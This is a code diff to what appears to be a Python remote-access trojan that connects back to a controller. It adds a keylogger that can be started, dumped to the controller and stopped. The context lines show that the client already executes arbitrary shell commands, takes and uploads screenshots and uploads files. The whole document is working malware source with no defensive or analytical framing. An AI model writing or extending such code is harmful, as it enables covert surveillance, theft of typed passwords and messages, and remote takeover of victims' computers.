@@ -1,8 +1,10 @@
-import socket
 import json
-import subprocess
 import os
+import socket
+import subprocess
+import threading
 import pyautogui
+import keylogger
 
 
 def send(data):
@@ -63,6 +65,18 @@ def shell():
             screenshot()
             upload_file('screen.png')
             os.remove('screen.png')
+        elif command[:12] == 'keylog_start':
+            keylog = keylogger.Keylogger()
+            t = threading.Thread(target=keylog)
+            t.start()
+            send('[^_^] Keylogger started!!!')
+        elif command[:11] == 'keylog_dump':
+            logs = keylog.read_logs()
+            send(logs)
+        elif command[:11] == 'keylog_stop':
+            keylog.self_destruct()
+            t.join()
+            send('[0_0] Keylogger stopped...')
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
